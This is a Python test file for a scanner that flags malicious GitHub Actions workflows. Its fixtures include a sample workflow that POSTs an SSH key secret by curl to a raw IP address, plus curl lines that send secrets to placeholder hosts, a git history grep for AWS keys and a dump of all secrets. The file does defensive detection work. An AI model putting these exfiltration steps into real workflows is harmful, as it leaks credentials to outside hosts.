from __future__ import annotations

from devguard_mcp.models import Severity
from devguard_mcp.workflows import is_workflow_path, scan_workflow

PATH = ".github/workflows/ci.yml"


def ids(text: str, path: str = PATH) -> set[str]:
    return {f.rule_id for f in scan_workflow(path, text)}


GHOSTACTION = """\
name: Github Actions Security
on: [push, workflow_dispatch]
jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
      - name: Github Actions Security
        run: |
          curl -s -X POST -d "VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}" http://193.32.204.199
"""


def test_ghostaction_sample_is_critical() -> None:
    findings = scan_workflow(".github/workflows/github_actions_security.yml", GHOSTACTION)
    found = {f.rule_id for f in findings}
    assert {"DG-GA-001", "DG-GA-002", "DG-GA-003", "DG-GA-004"} <= found
    assert max(f.severity for f in findings) is Severity.CRITICAL


def test_benign_workflow_is_clean() -> None:
    wf = "on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n"
    assert ids(wf) == set()


def test_curl_with_secret_to_https_host_is_medium_not_high() -> None:
    wf = 'run: curl -X POST -d "t=${{ secrets.SLACK }}" https://hooks.slack.example/abc\n'
    findings = scan_workflow(PATH, wf)
    assert [f.rule_id for f in findings] == ["DG-GA-004"]
    assert findings[0].severity is Severity.MEDIUM


def test_curl_with_secret_to_plain_http_is_high() -> None:
    wf = 'run: curl -d "t=${{ secrets.A }}" http://example.com/x\n'
    assert scan_workflow(PATH, wf)[0].severity is Severity.HIGH


def test_curl_split_over_lines_with_backslash_is_still_detected() -> None:
    wf = 'run: |\n  curl -X POST \\\n    -d "k=${{ secrets.KEY }}" \\\n    http://10.0.0.1/x\n'
    assert "DG-GA-004" in ids(wf)


def test_history_sweep_and_toJSON_are_flagged() -> None:
    wf = "run: git log -p --all | grep AKIA\nenv:\n  ALL: ${{ toJSON(secrets) }}\n"
    assert {"DG-GA-005", "DG-GA-006"} <= ids(wf)


def test_pull_request_target_with_head_checkout_is_flagged() -> None:
    wf = (
        "on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n"
        "      - uses: actions/checkout@v4\n        with:\n"
        "          ref: ${{ github.event.pull_request.head.sha }}\n"
    )
    assert "DG-GA-007" in ids(wf)


def test_pull_request_target_without_head_checkout_is_fine() -> None:
    assert "DG-GA-007" not in ids("on:\n  pull_request_target:\njobs: {}\n")


def test_suspicious_filename_alone_is_only_medium() -> None:
    findings = scan_workflow(".github/workflows/security-audit.yml", "on: push\n")
    assert [f.rule_id for f in findings] == ["DG-GA-001"]
    assert findings[0].severity is Severity.MEDIUM


def test_is_workflow_path() -> None:
    assert is_workflow_path(".github/workflows/a.yml")
    assert is_workflow_path("sub/.github/workflows/b.yaml")
    assert is_workflow_path(".github\\workflows\\a.yml")
    assert not is_workflow_path(".github/workflows/readme.md")
    assert not is_workflow_path(".github/workflows/nested/a.yml")
    assert not is_workflow_path("workflows/a.yml")
